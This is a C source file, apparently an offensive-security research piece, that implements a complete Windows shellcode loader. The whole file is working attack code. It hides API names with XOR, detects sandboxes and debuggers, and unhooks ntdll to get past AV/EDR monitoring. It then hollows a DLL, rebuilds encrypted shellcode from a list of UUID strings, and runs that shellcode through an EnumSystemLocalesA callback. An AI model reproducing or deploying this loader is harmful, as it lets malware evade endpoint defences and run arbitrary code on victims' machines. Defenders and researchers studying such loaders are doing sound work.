
#include <Windows.h>
#include <TlHelp32.h>
#include <Rpc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define GETIMAGESIZE(x) (x->pNtHdr->OptionalHeader.SizeOfImage)
#define GETMODULEBASE(x) ((PVOID)x->pDosHdr)
#define STARTSWITHA(x1, x2) ((strlen(x2) > strlen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1, x2, strlen(x2))))
#define ENDSWITHW(x1, x2) ((wcslen(x2) > wcslen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1 + wcslen(x1) - wcslen(x2), x2, wcslen(x2))))

#if defined(_WIN64)
#define SYSCALLSIZE 0x20
#else
#define SYSCALLSIZE 0x10
#endif

#define KEY 0xd7
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE 0x1fe


typedef struct
{
    PIMAGE_DOS_HEADER pDosHdr;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_EXPORT_DIRECTORY pExpDir;
    PIMAGE_SECTION_HEADER pTextSection;
} IMAGE, *PIMAGE;


/* PEB structures redefintion */
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK *pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, *_PPEB;


typedef HANDLE(WINAPI *CreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *ReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
typedef BOOL(WINAPI *TerminateProcessFunc)(HANDLE, UINT);
typedef LPVOID(WINAPI *VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);


DWORD g_dwNumberOfHooked = 0;

char cLib1Name[] = { 0xbc, 0xb2, 0xa5, 0xb9, 0xb2, 0xbb, 0xe4, 0xe5, 0xf9, 0xb3, 0xbb, 0xbb, 0x0 };
char cLib2Name[] = { 0xba, 0xa4, 0xbf, 0xa3, 0xba, 0xbb, 0xf9, 0xb3, 0xbb, 0xbb, 0x0 };
char cCreateFileA[] = { 0x94, 0xa5, 0xb2, 0xb6, 0xa3, 0xb2, 0x91, 0xbe, 0xbb, 0xb2, 0x96, 0x0 };
char cCreateProcessA[] = { 0x94, 0xa5, 0xb2, 0xb6, 0xa3, 0xb2, 0x87, 0xa5, 0xb8, 0xb4, 0xb2, 0xa4, 0xa4, 0x96, 0x0 };
char cReadProcessMemory[] = { 0x85, 0xb2, 0xb6, 0xb3, 0x87, 0xa5, 0xb8, 0xb4, 0xb2, 0xa4, 0xa4, 0x9a, 0xb2, 0xba, 0xb8, 0xa5, 0xae, 0x0 };
char cTerminateProcess[] = { 0x83, 0xb2, 0xa5, 0xba, 0xbe, 0xb9, 0xb6, 0xa3, 0xb2, 0x87, 0xa5, 0xb8, 0xb4, 0xb2, 0xa4, 0xa4, 0x0 };
char cVirtualAlloc[] = { 0x81, 0xbe, 0xa5, 0xa3, 0xa2, 0xb6, 0xbb, 0x96, 0xbb, 0xbb, 0xb8, 0xb4, 0x0 };
char cVirtualProtect[] = { 0x81, 0xbe, 0xa5, 0xa3, 0xa2, 0xb6, 0xbb, 0x87, 0xa5, 0xb8, 0xa3, 0xb2, 0xb4, 0xa3, 0x0 };

char decKey[] = { 0xad, 0xb8, 0xbe, 0xa5, 0xbd, 0xbf, 0xba, 0xb8, 0xa5, 0xb2, 0xad, 0xbd, 0xb0, 0xb9, 0xbe, 0xb2, 0xad, 0xbb, 0xb9, 0xb2, 0xb1, 0xa2, 0xb2, 0xbe, 0xbb, 0xa2, 0xb1, 0xb5, 0xa2, 0xbe, 0xb2, 0xb5, 0xb1, 0xa5, 0xb2, 0xa2, 0xb2, 0xa5, 0xb1, 0xbb, 0xa2, 0xbe, 0xbb, 0xb1, 0xb2, 0xad, 0x0 };

const char *uuids[] = {
        "96ea2786-809a-6fa1-7265-3b3b263e3b2d",
        "333fbe4b-3d03-3bee-0c3d-ed306d21ee30",
        "bc543f46-7d2d-26d1-3f21-e71435324baf",
        "140b4ec5-436f-2452-bba3-6a2f68a49881",
        "27ed2d3c-e245-492e-2733-3d68b504e70a",
        "7d677e7d-1ee3-6975-6ced-e5f27a6f693a",
        "0819a8ef-643a-2eaa-ec2e-49ee32742764",
        "3f8625b6-4421-2aaf-8aa0-24e952fa2d74",
        "ac573ab3-a834-6ba5-c93b-7bae51921f99",
        "413e6c21-2f72-bf5e-1cbd-2228e525423c",
        "340ab964-6eed-2d3d-ee22-7a3b64a524f9",
        "3134e462-3e2d-233b-326e-b9282b302c36",
        "e9323f33-4e8b-3728-858c-36243f2f2de2",
        "9d2d9c7e-968a-2b38-d805-16473a41546c",
        "2f3a2875-9cec-ee32-85d2-6b686d26fb80",
        "6e65d633-d44d-7670-6467-27212ce08839",
        "d33493ef-1529-7540-9aa0-29fb8c047468",
        "3b3c666c-46c0-19e9-6a97-b8057824243a",
        "ac582337-5d37-2dae-99b5-2de0ae3d99a2",
        "23a4e03d-98dc-aa6a-858d-b324fcae0676",
        "e6362224-3a8b-91e3-2cd5-ebc00e0b98bb",
        "660ea5ec-9a27-00a8-8081-ff7566623dea",
        "fb2e7289-3887-bb54-0c68-343124ef9c3b",
        "bab06dc0-9735-ecb8-8a65-043f2fedad45",
        "0f98e524-3426-013c-6c65-666234312deb",
        "bc543a94-c824-c83e-268c-93b32df3b926",
        "5927b5e0-26a4-95fb-32e3-bd26e09c3bd6",
        "2aaebc6c-bc9a-8def-661f-5d3124353f1a",
        "72653565-3427-691f-3627-df715560598d",
        "2e343fbf-10c8-2714-0691-bc2c85a28759",
        "219a8a99-b66d-4b2e-b321-e09413c6248a",
        "6c0c2a82-202c-a4ab-95cf-d83996a79090"
};

unsigned char *pShell; 


CreateFileAFunc pCreateFileAFunc;
CreateProcessAFunc pCreateProcessAFunc;
ReadProcessMemoryFunc pReadProcessMemoryFunc;
TerminateProcessFunc pTerminateProcessFunc;
VirtualAllocFunc pVirtualAllocFunc;
VirtualProtectFunc pVirtualProtectFunc;


_PPEB GetPEB()
{
    /* 
        Get Process Environment Block without call any winapi like NtQueryInformationProcess, 
        By reading fs/gs registers, read the link below to know more about what is these registers.
        => https://stackoverflow.com/questions/10810203/what-is-the-fs-gs-register-intended-for
    */
#if defined(_WIN64)
    /*
        ; mov rax, gs:[60h]
    */
    return (_PPEB)__readgsqword(0x60);
#else
    /*
        ; mov eax, fs:[30h]
    */
    return (_PPEB)__readfsdword(0x30);
#endif
}

PVOID FindNtDLL(_PPEB pPEB)
{
    /*
        Parse Process Environment Block and obtaine ntdll base address from it,
        Very useful resource about PEB => https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block
    */
    PVOID pDllBase = NULL;

    /* Get LoaDeR data structure which contains information about all of the loaded modules */
    PPEB_LDR_DATA pLdr = pPEB->pLdr;
    PLDR_DATA_TABLE_ENTRY pLdrData;
    PLIST_ENTRY pEntryList = &pLdr->InMemoryOrderModuleList;
    
    /* Walk through module list */
    for (PLIST_ENTRY pEntry = pEntryList->Flink; pEntry != pEntryList; pEntry = pEntry->Flink)
    {
        pLdrData = (PLDR_DATA_TABLE_ENTRY)pEntry;

        /* If the module ends with ntdll.dll, get its base address */
        if (ENDSWITHW(pLdrData->FullDllName.pBuffer, L"ntdll.dll"))
        {
            pDllBase = (PVOID)pLdrData->DllBase;
            break;
        }

    }
    
    return pDllBase;
}


PIMAGE ParseImage(PBYTE pImg)
{
    /*
        You can read these resources to know more about PEs
        Intro => https://resources.infosecinstitute.com/topic/2-malware-researchers-handbook-demystifying-pe-file/
        Detailed => https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
    */
    PIMAGE pParseImg;

    /* Allocate memory space for the image */
    if (!(pParseImg = (PIMAGE) malloc(sizeof(IMAGE))))
    {
        return NULL;
    }

    /* Parse DOS Header */
    pParseImg->pDosHdr = (PIMAGE_DOS_HEADER)pImg;

    /* Check if we parse a valid image or not */
    if (pParseImg->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        /* 
            This isn't a valid image,
            Every image has a fixed magic number ==> 0x5a4d
        */

        free(pParseImg);
        return NULL;
    }

    /* Parse NT Header */
    pParseImg->pNtHdr = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImg + pParseImg->pDosHdr->e_lfanew);
	
    /* Check if this is the NT header or not */
    if (pParseImg->pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        free(pParseImg);
        return NULL;
    }
	
    /* Parse Export Directory */
    pParseImg->pExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pImg + pParseImg->pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
	
    /* Parse .text section, it's a first section */
    pParseImg->pTextSection = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pParseImg->pNtHdr);
	
    return pParseImg;
}

PVOID GetFreshCopy(PIMAGE pHookedImg)
{
    /*
        Create a suspended process and retrieve a fresh copy from it
        Before get hooked by AV/EDRs.

        => https://blog.sektor7.net/#!res/2021/perunsfart.md
    */

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    PVOID pDllBase;
    SIZE_T nModuleSize, nBytesRead = 0;

    if (
        !pCreateProcessAFunc(
        NULL, 
        (LPSTR)"cmd.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 
        NULL, 
        (LPCSTR)"C:\\Windows\\System32\\", 
        &si, 
        &pi)
    )
        return NULL;

    nModuleSize = GETIMAGESIZE(pHookedImg);

    /* Allocate Memory for the fresh copy */
    if (!(pDllBase = (PVOID)pVirtualAllocFunc(NULL, nModuleSize, MEM_COMMIT, PAGE_READWRITE)))
        return NULL;

    /* Read a fresh copy from the process */
    if (!pReadProcessMemoryFunc(pi.hProcess, (LPCVOID)GETMODULEBASE(pHookedImg), pDllBase, nModuleSize, &nBytesRead))
        return NULL;

    /* We don't need the process anymore */
    pTerminateProcessFunc(pi.hProcess, 0);

    return pDllBase;
}

PVOID FindEntry(PIMAGE pFreshImg, PCHAR cFunctionName) {
    /* Get needed information from the Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNameOrdinals);

    for (WORD idx = 0; idx < pFreshImg->pExpDir->NumberOfNames; idx++) {
        PCHAR cFuncName = (PCHAR)GETMODULEBASE(pFreshImg) + pdwAddrOfNames[idx];
        PBYTE pFuncAddr = (PBYTE)GETMODULEBASE(pFreshImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        if (strcmp(cFuncName, cFunctionName) == 0)
        {
#if defined(_WIN64)
            WORD wCtr = 0;

            while(TRUE)
            {
                /* If we reach syscall instruction before --> <mov r10, rcx> */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x0f\x05", 2))
                    break;
            
                /* ret instruction (the end of the syscall) */
                if (*(pFuncAddr + wCtr) == 0xc3)
                    break;

                /*
                  Syscalls starts with the following instrucions
                  ; mov r10, rcx
                  ; mov eax, ...

                  If we reach this pattern, this is what we search about.
                */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x4c\x8b\xd1\xb8", 4) && 
                    RtlEqualMemory(pFuncAddr + wCtr + 6, "\x00\x00", 2)
                )
                {
                    return pFuncAddr;
                }

                wCtr++;
            }
#else
            if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
                return pFuncAddr;
#endif

        }
    }

    return NULL;
}

BOOL IsHooked(PVOID pAPI)
{
    /* If the first syscall instruction was jmp, it's hooked */
    if (*((PBYTE)pAPI) == 0xe9)
    {
        g_dwNumberOfHooked++;
        return TRUE;
    }

    return FALSE;
}

BOOL RemoveHooks(PIMAGE pHookedImg, PIMAGE pFreshImg)
{
    PCHAR cFuncName;
    PBYTE pFuncAddr;
    PVOID pFreshFuncAddr;
    DWORD dwOldProtect = 0;

    /* Get the Addresses of the functions and names from Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNameOrdinals);

    /* Change page permission of .text section to patch it */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    for (WORD idx = 0; idx < pHookedImg->pExpDir->NumberOfNames; idx++)
    {
        cFuncName = (PCHAR)GETMODULEBASE(pHookedImg) + pdwAddrOfNames[idx];
        pFuncAddr = (PBYTE)GETMODULEBASE(pHookedImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        /* Get only Nt/Zw APIs */
        if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
        {
#if defined(_WIN64)
            /* Exclude these APIs, because they have a jmp instruction */
            if (RtlEqualMemory(cFuncName, "NtQuerySystemTime", 18) || RtlEqualMemory(cFuncName, "ZwQuerySystemTime", 18))
                continue;
#endif

            if (IsHooked(pFuncAddr))
            {
                /* Find the clean syscall from the fresh copy, to patch the hooked syscall */
                if ((pFreshFuncAddr = FindEntry(pFreshImg, cFuncName)) != NULL)
                    /* Patch it */
                    RtlCopyMemory(pFuncAddr, pFreshFuncAddr, SYSCALLSIZE);					
	
            }
        }
    }

    /* Back the old permission */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, dwOldProtect, &dwOldProtect))
        return FALSE;

	
    return TRUE;
}

BOOL UnHookNtDLL(PVOID pNtDLL)
{
    PVOID pFreshNtDLL;
    PIMAGE pHookedImg, pFreshImg;
    BOOL bRet;

    /* Parse ntdll */
    if (!(pHookedImg = ParseImage((PBYTE)pNtDLL)))
        return FALSE;

    /* Get a clean copy of ntdll.dll */
    if (!(pFreshNtDLL = GetFreshCopy(pHookedImg)))
        return FALSE;

    /* Parse the fresh copy */
    if (!(pFreshImg = ParseImage((PBYTE)pFreshNtDLL)))
        return FALSE;

    /* Remove hooks from hooked syscalls one by one */
    bRet = RemoveHooks(pHookedImg, pFreshImg);

    /* Deallocate memory */
    free(pHookedImg);
    free(pFreshImg);

    return bRet;
}


BOOL FindProcById(DWORD dwProcId, PROCESSENTRY32 *pe32)
{

    HANDLE hSnapshot;
    BOOL bSuccess = FALSE;

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
    {
        pe32->dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, pe32)) 
        {
            do {
                if (pe32->th32ProcessID == dwProcId)
                {
                    bSuccess = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, pe32));
        }

        CloseHandle(hSnapshot);
    } 

    return bSuccess;
}


void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cCreateFileA);
    deObfuscateData(cCreateProcessA);
    deObfuscateData(cReadProcessMemory);
    deObfuscateData(cTerminateProcess);
    deObfuscateData(cVirtualAlloc);
    deObfuscateData(cVirtualProtect);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int _tmain(int argc, TCHAR **argv)
{  
    _PPEB pPEB;
    PVOID pNtDLL;
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    char *pMem;
    int nMemAlloc, nCtr = 0;
    PROCESSENTRY32 pe32;

    printf("1");
    getchar();

    if (FindProcById(GetCurrentProcessId(), &pe32))
    {
        _tprintf(TEXT("Current pid = %d, exename = %s\n"), pe32.th32ProcessID, pe32.szExeFile);
        printf("We found the parent proccess id -> %d\n", pe32.th32ParentProcessID);

        if (FindProcById(pe32.th32ParentProcessID, &pe32))
        {
            _tprintf(TEXT("The parent process is %s\n"), pe32.szExeFile);

            /* We expect that will be run from cmd or powershell, else maybe we're inside sandbox */
            if (!(_tcscmp(pe32.szExeFile, TEXT("cmd.exe")) == 0 || _tcscmp(pe32.szExeFile, TEXT("powershell.exe")) == 0))
                return EXIT_FAILURE;
        }
    }

    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
    deObfuscateAll();

    printf("2");
    getchar();
    
    /* Load needed libs */
    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

    /* Get the Addresses of the APIs */
    if (!(
        (pCreateFileAFunc = (CreateFileAFunc) GetProcAddress(hModule, cCreateFileA)) &&
        (pCreateProcessAFunc = (CreateProcessAFunc) GetProcAddress(hModule, cCreateProcessA)) &&
        (pReadProcessMemoryFunc = (ReadProcessMemoryFunc) GetProcAddress(hModule, cReadProcessMemory)) &&
        (pTerminateProcessFunc = (TerminateProcessFunc) GetProcAddress(hModule, cTerminateProcess)) &&
        (pVirtualAllocFunc = (VirtualAllocFunc) GetProcAddress(hModule, cVirtualAlloc)) &&
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect))
    )) {
        return EXIT_FAILURE;
    }

    /* Check for a non-exist file, if found it we're inside sandbox */
    if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    pPEB = GetPEB();
    
    /* Check if the process under debugger */
    if (pPEB->bBeingDebugged)
    {
        puts("The current process running under debugger");
        return EXIT_FAILURE;
    }

    /* 
        Move key bits to left, let's say the key is 0xfa,
        Will represented as following in memory :
            -> 00000000 00000000 00000000 11111010

        After moving will be :
            -> 00001111 10100000 00000000 00000000

        That's a very large number.
    */
    nMemAlloc = KEY << 20;

    /* Ask os for very large memory, if fail maybe we're inside sandbox */
    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    /* Make large iterations */
    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        /* Count every iteration one by one */
        pMem[nCtr++] = 0x00;
    }
    
    /* If number of iterations and the counter isn't same, we're inside sandbox */
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    /* Deallocate memory */
    free(pMem);

    puts("Try to find ntdll.dll base address from PEB, without call GetModuleHandle/LoadLibrary");
    if(!(pNtDLL = FindNtDLL(pPEB)))
    {
        puts("Could not find ntdll.dll");
        return EXIT_FAILURE;
    }

    printf("ntdll base address = %p\n", pNtDLL);

    puts("Try to unhook ntdll");
    if (!UnHookNtDLL(pNtDLL))
    {
        puts("Something goes wrong in UnHooking phase");
        return EXIT_FAILURE;
    }

    if (g_dwNumberOfHooked != 0)
        printf("There were %d hooked syscalls\n", g_dwNumberOfHooked);

    else
        puts("There are no hooked syscalls");
        
    printf("3");
    getchar();
    /* 
        DLL hollowing to bypass memory monitoring.
        Useful resource --> https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
        DLL Base Addr + 0x1000 = RWX section.
        We can parse it and obtain the same result.
    */
    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;

    /* Shell will point to the hollowed address */
    pShell = (unsigned char *) pFuncAddr;

    /* This will read shellcode from UUIDs, and reflect it in the hollowed DLL directly */
    pShellReader = (DWORD_PTR) pShell;

    printf("Shellcode will be written at %p\n", pShell);

    /* Change permission of the section, to overwrite it */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        /* We have read 16 byte (The size of each UUID), let's move to the next memory space */
        pShellReader += 0x10;
    }
    printf("4");
    getchar();

    puts("Decrypt shellcode");
    decShell();
    
    printf("5");
    getchar();
    
    /* Back the old permission */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    printf("6");
    getchar();
    
    puts("Inject shellcode, without creating a new thread");

    /* 
        No new thread payload execution, 
        Creating a new thread is a bad thing (can be monitored by EDRs)
    */
    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pFuncAddr, LCID_SUPPORTED) != 0;

}

